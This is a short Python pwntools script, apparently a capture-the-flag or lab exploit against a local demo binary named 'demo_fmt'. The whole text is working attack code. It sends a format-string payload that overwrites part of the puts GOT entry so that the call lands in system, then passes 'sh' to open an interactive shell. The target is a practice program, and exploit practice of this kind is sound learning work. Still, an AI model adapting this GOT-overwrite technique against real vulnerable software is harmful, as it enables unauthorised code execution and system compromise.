from pwn import *


context.arch = 'amd64'


r = process('./demo_fmt')

puts_got = 0x404018
system_resolve_chain = 0x401050

gdb.attach(r)
r.sendafter("Give me fmt: ", b'%176c%8$hhn' + b'AAAAA' + p64(puts_got))
r.sendafter("Give me string: ", 'sh\x00')

r.interactive()
